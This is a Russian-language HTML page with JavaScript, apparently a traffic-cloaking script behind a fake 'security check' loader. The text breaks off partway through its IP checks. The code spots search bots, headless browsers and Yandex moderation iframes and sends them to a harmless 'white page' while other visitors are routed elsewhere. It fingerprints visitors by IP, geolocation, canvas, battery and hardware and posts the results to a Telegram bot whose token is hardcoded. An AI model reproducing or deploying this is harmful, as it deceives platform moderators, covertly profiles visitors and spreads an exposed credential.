<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        /* Полные стили из вашего оригинального примера */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08),
                        0 6px 12px rgba(0, 0, 0, 0.05),
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
            top: -9999px; /* Еще лучше спрятать */
            left: -9999px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @keyframes cursor-animation {
            0% { transform: translate(0, 0); }
            25% { transform: translate(10px, 10px); }
            50% { transform: translate(-10px, 10px); }
            75% { transform: translate(5px, -10px); }
            100% { transform: translate(0, 0); }
        }

        /* Стили для мобильных устройств */
        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }

            .loader {
                width: 50px;
                height: 50px;
            }

            .loading-text {
                font-size: 18px;
            }

            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">Загрузка...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>Проверка безопасности</h3>
        <div class="mouse-icon"></div>
        <p>Пожалуйста, подвигайте курсором, чтобы продолжить</p>
    </div>

    <a href="#" class="bot-trap-link" aria-hidden="true" tabindex="-1">Секретная ссылка только для ботов</a>

    <!-- Yandex.Metrika counter -->
    <script type="text/javascript" >
       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
       m[i].l=1*new Date();
       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

       ym(101122135, "init", { // ЗАМЕНИТЕ НА ВАШ ID СЧЕТЧИКА
            clickmap:true,
            trackLinks:true,
            accurateTrackBounce:true,
            webvisor:true,
            defer: true // Отложенная инициализация
       });
    </script>
    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- ЗАМЕНИТЕ НА ВАШ ID СЧЕТЧИКА -->
    <!-- /Yandex.Metrika counter -->

    <script>
    (async function() {
        'use strict';

        // ===== КОНСТАНТЫ И НАСТРОЙКИ =====
        const PAGE_LOAD_START = performance.now();
        const WHITE_PAGE = 'https://dzen.ru'; // Белая страница
        const BLACK_PAGE = 'https://google.com'; // Черная страница по умолчанию
        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU'; // !!! ВАШ ТОКЕН !!!
        const TELEGRAM_CHAT_ID = '1237450939'; // !!! ВАШ ID ЧАТА !!!

        // --- Настройки по умолчанию (могут быть переопределены из config.txt) ---
        let config = {
            common: {
                TelegramReporting: true,
                debugMode: false // Включить для подробных логов в консоли
            },
            desktop: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: true,
                CheckMouseMovement: true,
                CheckVisitFrequency: true,
                MouseMovementTimeout: 5000, // мс
                RedirectDelay: 1500, // мс
                MaxVisitsBeforeBlock: 5,
                BlockDuration: 3600000 // 1 час в мс
            },
            mobile: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: false,
                CheckMouseMovement: false,
                CheckVisitFrequency: false,
                RedirectDelay: 800, // мс
                MaxVisitsBeforeBlock: 10,
                BlockDuration: 3600000 // 1 час в мс
            },
            experimental: {
                CheckAdBlocker: false,
                CheckVirtualMachine: false,
                CheckTorNetwork: false,
                CheckVPN: false,
                PerformTimingAttacks: false,
                CheckWebRTCLeakage: false,
                CheckPermissionsAPI: true // Добавлено: Проверка Permissions API
            }
        };
        // --- Конец настроек по умолчанию ---

        // Списки для определения ботов (ПОЛНЫЙ СПИСОК ИЗ ВАШЕГО ПРИМЕРА)
        const SEARCH_BOT_AGENTS = [
            // Яндекс боты (ТОЛЬКО боты, не обычные пользователи)
            /YandexBot/i, /YandexAccessibilityBot/i, /YandexMobileBot/i, /YandexDirectDyn/i,
            /YandexImages/i, /YandexVideo/i, /YandexVideoParser/i, /YandexMedia/i,
            /YandexBlogs/i, /YandexFavicons/i, /YandexWebmaster/i, /YandexPagechecker/i,
            /YandexImageResizer/i, /YaDirectFetcher/i, /YandexCalendar/i, /YandexSitelinks/i,
            /YandexMetrika/i, /YandexNews/i, /YandexCatalog/i, /YandexMarket/i,
            /YandexVerticals/i, /YandexVertis/i, /YandexSearchShop/i, /YandexOntoDB/i,
            /YandexOntoDBAPI/i, /YandexRCA/i, /YandexSpravBot/i, /YandexScreenshotBot/i,
            /YandexMobileScreenShotBot/i, /YandexAdNet/i, /YandexDirect/i, /YandexTurbo/i,
            /YandexRenderResourcesBot/i, /YandexTracker/i, /YandexPartner/i, /YandexComBot/i,

            // Google боты
            /Googlebot/i, /AdsBot-Google/i, /Google-Read-Aloud/i, /DuplexWeb-Google/i,
            /Google Favicon/i, /googleweblight/i, /Storebot-Google/i, /Google-PageRenderer/i,
            /Google-Site-Verification/i, /Google-SearchByImage/i, /GoogleAccessibilityTest/i,
            /GoogleProducer/i, /APIs-Google/i, /Google-Adwords-Instant/i, /FeedFetcher-Google/i,
            /Google-Apps-Script/i,

            // Microsoft/Bing боты
            /bingbot/i, /msnbot/i, /BingPreview/i, /AdIdxBot/i, /MicrosoftPreview/i, /MicrosoftSearch/i,

            // Другие поисковые боты
            /slurp/i, /duckduckbot/i, /baiduspider/i, /Yahoo! Slurp/i, /YahooSeeker/i,
            /Exabot/i, /facebookexternalhit/i, /ia_archiver/i,
            /Applebot/i, /archive.org_bot/i, /BuiltWith/i, /Bot.AraTear/i, /BUbiNG/i,
            /Chrome-Lighthouse/i, /Clickagy/i, /CliniqueBot/i, /DomainStatsBot/i, /evc-batch/i,

            // Общие паттерны для ботов
            /Crawler/i, /crawler/i, /Spider/i, /spider/i, /archiver/i, /validator/i,
            /parser/i, /reader/i, /indexer/i, /panscient/i, /monitoring/i,

            // SEO/Аналитические инструменты
            /semrush/i, /ahrefs/i, /mj12bot/i, /majestic/i, /rogerbot/i, /dotbot/i,
            /screaming/i, /seokicks/i, /sistrix/i, /seobilitybot/i, /seoscanners/i,
            /proximic/i, /pingdom/i, /gtmetrix/i, /pagespeed/i, /webmeup/i, /Catchpoint/i,
            /Riddler/i, /Nessus/i, /datasift/i, /BLEXBot/i, /AspiegelBot/i, /ScoutJet/i,

            // Новые боты из 2023
            /bytespider/i, /DeepCrawl/i, /Sogou/i, /MojeekBot/i,
            /SeznamBot/i, /Mail.RU_Bot/i, /SemrushBot/i, /Qwantify/i, /CensysInspect/i,
            /PetalBot/i, /Cliqzbot/i, /QwantMobile/i, /coccocbot/i, /EarwigBot/i,
            /NetcraftSurveyAgent/i, /weborama-fetcher/i, /BrightSign/i, /Cookiebot/i,
            /DataForSeoBot/i,

            // Дополнительные паттерны (на всякий случай)
            /headless/i, /fetcher/i, /httpclient/i, /python-requests/i, /curl/i, /wget/i,
            /okhttp/i, /java/i, /perl/i, /scrapy/i, /libwww-perl/i, /zgrab/i
        ];
        const YANDEX_REGULAR_APPS = [ // Исключить обычные приложения Яндекса и браузеры
            /YaBrowser/i, /YandexSearch/i, /Yandex\/[\d\.]+/i, /Dzen/i, /YandexMobileApp/i
        ];
        const YANDEX_DOMAINS = [ // Домены Яндекса для проверки обратного DNS
            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz',
            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
        ];
        // Строгий паттерн для Я.Ботов (не пользователей)
        const strictYandexBotPattern = /YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVerticals|YandexVertis|YandexSearchShop|YandexOntoDB|YandexOntoDBAPI|YandexRCA|YandexSpravBot|YandexScreenshotBot|YandexMobileScreenShotBot|YandexAdNet|YandexDirect|YandexTurbo|YandexRenderResourcesBot|YandexTracker|YandexPartner|YandexComBot|MirrorDetector/i;

        // Флаги состояния
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let pageFullyLoaded = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        let redirectTimeout = null;
        let userInfo = null; // Сохраняем собранную информацию
        let onOffState = 'on'; // Состояние onoff.txt по умолчанию
        let blockReason = ''; // Причина блокировки

        // Элементы DOM
        let humanVerificationBlock = null; // Инициализируем позже

        // Определение типа устройства
        const userAgent = navigator.userAgent || '';
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

        // Счетчик визитов
        let visitCount = 0;
        try {
            visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
            localStorage.setItem('visitCount', visitCount.toString());
        } catch (e) { console.warn("LocalStorage недоступен для счетчика визитов."); }

        // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====

        // Логирование для отладки
        function logDebug(message, ...args) {
            if (config.common.debugMode) {
                console.log(`[Cloak Debug] ${message}`, ...args);
            }
        }

        // Асинхронная загрузка файла
        async function loadFile(url) {
            try {
                const response = await fetch(url, { cache: 'no-store' }); // Добавлено cache: 'no-store'
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return await response.text();
            } catch (error) {
                logDebug(`Не удалось загрузить файл ${url}:`, error);
                return null;
            }
        }

        // Парсинг конфигурационного файла
        function parseConfig(configText) {
             if (!configText) return;
            logDebug("Парсинг config.txt...");
             let currentSection = 'common';
            const lines = configText.split('\n');

            for (const line of lines) {
                const trimmedLine = line.trim();
                if (!trimmedLine || trimmedLine.startsWith('#')) continue;
                if (trimmedLine.startsWith('[')) {
                    const sectionMatch = trimmedLine.match(/\[(.*?)\]/);
                    if (sectionMatch) {
                        currentSection = sectionMatch[1].toLowerCase();
                        if (!config[currentSection]) config[currentSection] = {}; // Создаем секцию, если ее нет
                        logDebug(`Переключились на секцию: [${currentSection}]`);
                    }
                    continue;
                }
                const parts = trimmedLine.split('=');
                if (parts.length === 2) {
                    const key = parts[0].trim();
                    const value = parts[1].trim().toLowerCase();
                    let targetSection = config[currentSection] || config.common; // Используем common, если секция не найдена

                    let parsedValue;
                    if (value === 'on' || value === 'true') {
                        parsedValue = true;
                    } else if (value === 'off' || value === 'false') {
                        parsedValue = false;
                    } else if (!isNaN(parseInt(value))) {
                        parsedValue = parseInt(value);
                    } else {
                        parsedValue = value; // Оставляем как строку, если не число и не boolean
                    }
                    targetSection[key] = parsedValue;
                    logDebug(`Установлен параметр [${currentSection}].${key} = ${parsedValue}`);
                }
            }
            logDebug("Конфигурация загружена:", config);
        }

        // Получение параметра из URL
        function getUrlParameter(name) {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(name);
            } catch (e) {
                logDebug("Ошибка при получении URL параметра:", e);
                return null;
            }
        }

        // Отслеживание частоты визитов
        function trackVisits() {
            try {
                const now = Date.now();
                const visits = JSON.parse(localStorage.getItem('recentVisits') || '[]');
                const recentVisits = visits.filter(timestamp => now - timestamp < 30 * 60 * 1000); // 30 минут
                recentVisits.push(now);
                localStorage.setItem('recentVisits', JSON.stringify(recentVisits));
                return recentVisits.length;
            } catch (e) {
                logDebug("LocalStorage недоступен для отслеживания частоты визитов.");
                return 1; // Возвращаем 1, чтобы не блокировать из-за ошибки
            }
        }

        // Проверка, заблокирован ли пользователь по частоте
        function isBlockedByFrequency() {
            const currentConfig = isMobile ? config.mobile : config.desktop;
            if (!currentConfig.CheckVisitFrequency || onOffState === 'off') {
                logDebug("Проверка частоты отключена (конфиг или onoff.txt).");
                return false;
            }

            try {
                const blockExpiry = parseInt(localStorage.getItem('blockExpiry') || '0');
                if (blockExpiry > Date.now()) {
                    logDebug("Пользователь заблокирован по частоте (срок еще не истек).");
                    return true;
                }

                const visitCount = trackVisits();
                const maxVisits = currentConfig.MaxVisitsBeforeBlock;
                logDebug(`Частота визитов: ${visitCount} / ${maxVisits}`);

                if (visitCount > maxVisits) {
                    const blockUntil = Date.now() + currentConfig.BlockDuration;
                    localStorage.setItem('blockExpiry', blockUntil.toString());
                    logDebug(`Превышен лимит частоты. Блокировка до ${new Date(blockUntil).toISOString()}`);
                    return true;
                }
            } catch (e) {
                logDebug("Ошибка при проверке частоты визитов:", e);
            }
            return false;
        }

        // Получение IP-адреса пользователя
        async function getIpAddress() {
            const services = [
                { url: 'https://api.ipify.org?format=json', extract: data => data.ip },
                { url: 'https://ipinfo.io/json', extract: data => data.ip },
                { url: 'https://api.myip.com', extract: data => data.ip }, // Вернули сервис из оригинала
                { url: 'https://ipapi.co/json/', extract: data => data.ip }
            ];
            for (const service of services) {
                try {
                    // Используем AbortSignal для таймаута
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 сек таймаут
                    const response = await fetch(service.url, { signal: controller.signal });
                    clearTimeout(timeoutId); // Очищаем таймаут, если ответ пришел вовремя

                    if (response.ok) {
                        const data = await response.json();
                        const ip = service.extract(data);
                        if (ip) {
                            logDebug(`IP адрес получен через ${service.url}: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    logDebug(`Ошибка при получении IP через ${service.url}:`, error.name === 'AbortError' ? 'Timeout' : error);
                }
            }
            logDebug("Не удалось определить IP-адрес ни одним из сервисов.");
            return "Не определено";
        }

        // Получение Canvas Fingerprint (из оригинала)
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint 👋', 2, 2); // Текст из оригинала
                ctx.fillStyle = '#f00';
                ctx.beginPath(); // Добавил beginPath
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                // Возвращаем начало Data URL как в оригинале
                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                logDebug("Canvas API недоступно или заблокировано.");
                return "Canvas недоступен";
            }
        }

        // Получение информации о батарее
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API недоступен";
            try {
                const battery = await navigator.getBattery();
                return { level: Math.round(battery.level * 100), charging: battery.charging };
            } catch (e) {
                logDebug("Ошибка доступа к Battery API:", e);
                return "Ошибка доступа";
            }
        }

        // Информация о памяти устройства
        function getDeviceMemory() {
            return navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Не определено";
        }

        // Информация о сетевом подключении
        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "Не определено";
            // Возвращаем объект как в оригинале
            return {
                type: conn.effectiveType || "unknown",
                rtt: conn.rtt || "unknown"
            };
        }

        // Сбор полной информации о пользователе (из оригинала, с асинхронностью)
        async function collectUserInfo() {
            logDebug("Сбор информации о пользователе...");
            const startTime = performance.now();
            let info = {};

            try {
                // Запускаем асинхронные операции параллельно
                const ipPromise = getIpAddress();
                const batteryPromise = getBatteryInfo();
                const geoPromise = ipPromise.then(ip => {
                    if (ip && ip !== "Не определено") {
                        return fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) })
                               .then(response => response.ok ? response.json() : Promise.reject('Geo API failed'))
                               .then(geoData => `${geoData.city || ""}, ${geoData.country_name || ""}`)
                               .catch(e => {
                                   logDebug("Ошибка получения геолокации:", e);
                                   return "Не определено";
                               });
                    }
                    return Promise.resolve("Не определено (IP не найден)");
                });

                // Собираем синхронные данные
                info = {
                    timestamp: new Date().toISOString(),
                    userAgent: userAgent,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(',') : "Не определено",
                    platform: navigator.platform,
                    deviceType: isMobile ? 'Мобильное устройство' : 'Десктоп',
                    visitCount: visitCount,
                    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio || 1 },
                    window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight },
                    url: window.location.href,
                    referrer: document.referrer || "none", // Как в оригинале
                    cookiesEnabled: navigator.cookieEnabled,
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    hardwareConcurrency: navigator.hardwareConcurrency || "Не определено",
                    memory: getDeviceMemory(),
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    connection: getConnectionInfo(),
                    doNotTrack: navigator.doNotTrack || "Не определено",
                    webdriver: !!navigator.webdriver,
                    plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') || "Не определено" : "Не определено",
                    canvas: getCanvasFingerprint(),
                    hadMouseMovement: hadMouseMovement,
                    botTrapActivated: botTrapActivated,
                    // Заполнятся после await
                    battery: "Определение...",
                    ipAddress: "Определение...",
                    geolocation: "Определение...",
                    loadTime: 0
                };

                // Дожидаемся асинхронных результатов
                info.ipAddress = await ipPromise;
                info.battery = await batteryPromise;
                info.geolocation = await geoPromise; // Уже содержит результат или "Не определено"

            } catch (error) {
                console.error("Критическая ошибка при сборе информации:", error);
                logDebug("Критическая ошибка при сборе информации:", error);
                info = { ...info, error: `Сбор данных не удался: ${error.message}` }; // Добавляем ошибку в объект
            } finally {
                info.loadTime = Math.round(performance.now() - PAGE_LOAD_START); // Время загрузки в конце
                logDebug(`Сбор информации завершен за ${Math.round(performance.now() - startTime)} мс.`);
                userInfo = info; // Сохраняем глобально
                return info;
            }
        }

        // Отправка отчета в Telegram (форматирование как в оригинале)
        async function sendTelegramReport(reason, data) {
            if (!config.common.TelegramReporting) {
                logDebug("Отправка отчетов в Telegram отключена.");
                return false;
            }
            if (!data) {
                logDebug("Нет данных для отправки отчета.");
                return false;
            }

            logDebug(`Подготовка отчета для Telegram. Причина: ${reason}`);

            // Формируем сообщение как в оригинале
            let message = `🪤 КЛОАКА: ЛОВУШКА СРАБОТАЛА\n\n`;
            message += `⚠️ Причина: ${reason}\n\n`;
            message += `📱 Тип устройства: ${data.deviceType || 'N/A'}\n`;
            message += `🔢 Счетчик посещений: ${data.visitCount || 'N/A'}\n`;
            message += `🌐 IP: ${data.ipAddress || 'N/A'}\n`;
            message += `📍 Геолокация: ${data.geolocation || 'N/A'}\n`;
            message += `🖥️ User-Agent: ${data.userAgent || 'N/A'}\n`;
            message += `📏 Экран: ${data.screen?.width || '?'}x${data.screen?.height || '?'} (${data.screen?.pixelRatio || '?'}x)\n`;
            message += `⏱️ Время загрузки: ${data.loadTime || '?'}мс\n`;
            message += `🔗 URL: ${data.url || 'N/A'}\n`;
            message += `↩️ Referrer: ${data.referrer || 'N/A'}\n\n`;
            message += `🖱️ Движение мыши: ${data.hadMouseMovement ? 'yes' : 'no'}\n`;
            const batteryInfo = typeof data.battery === 'object'
                ? `Заряд: ${data.battery.level}%, Заряжается: ${data.battery.charging ? 'да' : 'нет'}`
                : (data.battery || 'N/A');
            message += `🔋 Батарея: ${batteryInfo}\n`;
            message += `🧠 Ядра CPU: ${data.hardwareConcurrency || 'N/A'}\n`;
            message += `💾 Память: ${data.memory || 'N/A'}\n`;
            message += `🌍 Язык: ${data.language || 'N/A'}\n`;
            message += `⏰ Часовой пояс: ${data.timeZone || 'N/A'}\n`;
            const connectionInfo = typeof data.connection === 'object'
                ? `${data.connection.type} (RTT: ${data.connection.rtt})`
                : (data.connection || 'N/A');
            message += `🔌 Соединение: ${connectionInfo}\n`;
            message += `🤖 WebDriver: ${data.webdriver ? 'yes' : 'no'}\n`;
            message += `🎨 Canvas: ${data.canvas || 'N/A'}`;
            if (data.error) {
                message += `\n\n🆘 Ошибка сбора: ${data.error}`;
            }

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                // parse_mode: 'Markdown' // Как в оригинале, но может вызывать ошибки, если символы не экранированы
            };

            try {
                logDebug("Отправка запроса в Telegram...");
                // Используем fetch как в оригинале, но с таймаутом
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 сек таймаут

                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                 clearTimeout(timeoutId);

                if (!response.ok) {
                    // Попытка прочитать тело ошибки
                    let errorData = { description: 'Unknown error' };
                    try { errorData = await response.json(); } catch (e) {}
                    throw new Error(`Telegram API error: ${response.status} - ${errorData.description}`);
                }
                logDebug("Отчет успешно отправлен в Telegram.");
                return true;

            } catch (error) {
                console.error("Ошибка при отправке отчета в Telegram:", error);
                logDebug("Ошибка при отправке отчета в Telegram:", error.message);
                // Здесь можно добавить резервную отправку через XMLHttpRequest, если нужно
                return false;
            }
        }

        // ===== ФУНКЦИИ ПРОВЕРОК (логика из оригинала и улучшений) =====

        // Проверка на обычного пользователя Яндекса
        function isRegularYandexUser() {
            const result = YANDEX_REGULAR_APPS.some(pattern => pattern.test(userAgent));
            // logDebug(`isRegularYandexUser: ${result}`); // Раскомментировать для детальной отладки
            return result;
        }

        // Проверка на поискового бота по UA (с исключением обычных Я.Юзеров)
        function isSearchBotUA() {
            if (isRegularYandexUser()) return false;
            const result = SEARCH_BOT_AGENTS.some(pattern => pattern.test(userAgent));
            logDebug(`isSearchBotUA: ${result} (UA: ${userAgent.substring(0, 70)}...)`);
            return result;
        }

        // Проверка признаков headless-браузера (из оригинала)
        function isHeadlessBrowser() {
            if (isRegularYandexUser()) return false;

            let headless = false;
            let reason = '';

            if (navigator.webdriver) { headless = true; reason = 'navigator.webdriver'; }
            else if (window.domAutomation || window.domAutomationController) { headless = true; reason = 'window.domAutomation'; }
            else if (window._phantom || window.callPhantom) { headless = true; reason = 'PhantomJS'; }
            else if (document.documentElement.getAttribute('webdriver') || document.documentElement.getAttribute('selenium') || document.documentElement.getAttribute('driver')) { headless = true; reason = 'documentElement attribute'; }
            else if (userAgent.includes('HeadlessChrome') || userAgent.includes('Headless Firefox')) { headless = true; reason = 'UA contains Headless'; }
            // Проверка плагинов из оригинала
            else if (navigator.plugins && navigator.plugins.length === 0 && !isMobile) {
                 // У Яндекс Браузера и других могут быть свои особенности с плагинами
                 const uaLower = userAgent.toLowerCase();
                 if (!uaLower.includes('yabrowser') && !uaLower.includes('yandex') && !uaLower.includes('dzen')) {
                     headless = true; reason = 'navigator.plugins.length === 0';
                 }
            }
            // Проверка языков из оригинала
            else if (navigator.languages && navigator.languages.length === 0) {
                 headless = true; reason = 'navigator.languages.length === 0';
            }
            // Добавлена проверка Permissions API из улучшенной версии
             else if (config.experimental.CheckPermissionsAPI && typeof navigator.permissions?.query === 'function') {
                try {
                    navigator.permissions.query({ name: 'notifications' }).then(status => {
                        if (status.state === 'prompt' && !isMobile && !userAgent.includes('Firefox')) {
                            logDebug("Подозрительный статус Permissions API:", status.state);
                            // Можно использовать как доп. сигнал, но не делаем headless = true сразу
                        }
                    });
                } catch (e) { headless = true; reason = 'Permissions API error'; }
            }


            logDebug(`isHeadlessBrowser: ${headless} ${reason ? `(Причина: ${reason})` : ''}`);
            return headless;
        }

        // Проверка наличия iframe модерации Яндекса (из оригинала)
        function hasYandexModeratorIframe() {
            const iframes = document.querySelectorAll('iframe');
            for (const iframe of iframes) {
                const src = iframe.src || '';
                if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/iframe/mod') || src.includes('webvisor.com/mod') || src.includes('yandex.ru/moderation')) {
                    logDebug("Обнаружен iframe модерации Яндекса (по src).");
                    return true;
                }
            }
            if (typeof window.YaModerator !== 'undefined' || typeof window.YaModeration !== 'undefined') {
                 logDebug("Обнаружен JS-объект модерации Яндекса.");
                 return true;
            }
            return false;
        }

        // Настройка наблюдателя за DOM для iframe модерации (из оригинала)
        function setupModerationFrameObserver() {
            if (typeof MutationObserver === 'undefined') return;
            try {
                const observer = new MutationObserver((mutations) => {
                    for (const mutation of mutations) {
                        if (mutation.type === 'childList') {
                            for (const node of mutation.addedNodes) {
                                if (node.tagName === 'IFRAME') {
                                    const src = node.src || '';
                                    if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/iframe/mod') || src.includes('webvisor.com/mod') || src.includes('yandex.ru/moderation')) {
                                        logDebug("Обнаружен динамически добавленный iframe модерации!");
                                        if (!botTrapActivated && !redirectInitiated) { // Добавил !redirectInitiated
                                            botTrapActivated = true;
                                            blockReason = "Обнаружен iframe модерации (динамически)"; // Устанавливаем причину
                                            // Немедленно пытаемся отправить отчет и редиректнуть
                                            determineRedirectTarget().then(target => {
                                                // Редиректим только если цель - WHITE_PAGE (что должно быть так)
                                                if (target === WHITE_PAGE) redirect(WHITE_PAGE);
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                });
                observer.observe(document.body, { childList: true, subtree: true });
                logDebug("Наблюдатель за iframe модерации установлен.");
            } catch (e) {
                console.error("Ошибка при установке наблюдателя за iframe:", e);
            }
        }

        // Комплексная проверка на бота Яндекса (из оригинала, с асинхронным IP)
        async function isYandexBot() {
            if (isRegularYandexUser()) return false;

            // 1. Проверка User-Agent на явных ботов
            if (strictYandexBotPattern.test(userAgent)) {
                logDebug("isYandexBot: true (по strict UA pattern)");
                return true;
            }

            // 2. Проверка iframe модерации
            if (hasYandexModeratorIframe()) {
                 logDebug("isYandexBot: true (по iframe модерации)");
                 return true;
            }

            // 3. Проверка IP и DNS (если включено и есть IP)
            const shouldCheckIp = config.desktop.CheckYandexBot || config.mobile.CheckYandexBot;
            const currentIp = userInfo?.ipAddress; // Берем уже полученный IP
            if (shouldCheckIp && currentIp && currentIp !== "Не определено" && (/yandex/i.test(userAgent) || /bot|crawler|spider/i.test(userAgent))) {
                logDebug("isYandexBot: Выполняется проверка IP Яндекса...");
                try {
                    // Проверка обратного DNS через Google DNS (как в оригинале)
                    const controllerDNS = new AbortController();
                    const timeoutDNS = setTimeout(() => controllerDNS.abort(), 2000); // 2 сек таймаут
                    const responseDNS = await fetch(`https://dns.google/resolve?name=${currentIp.split('.').reverse().join('.')}.in-addr.arpa&type=PTR`, { signal: controllerDNS.signal });
                    clearTimeout(timeoutDNS);
                    if (responseDNS.ok) {
                        const dataDNS = await responseDNS.json();
                        if (dataDNS.Answer && dataDNS.Answer.some(ans => YANDEX_DOMAINS.some(domain => ans.data.includes(domain)))) {
                            logDebug("isYandexBot: true (по обратному DNS)");
                            return true;
                        }
                    }

                    // Проверка организации по IP (как в оригинале)
                    const controllerOrg = new AbortController();
                    const timeoutOrg = setTimeout(() => controllerOrg.abort(), 2000); // 2 сек таймаут
                    const orgResponse = await fetch(`https://ipapi.co/${currentIp}/org/`, { signal: controllerOrg.signal });
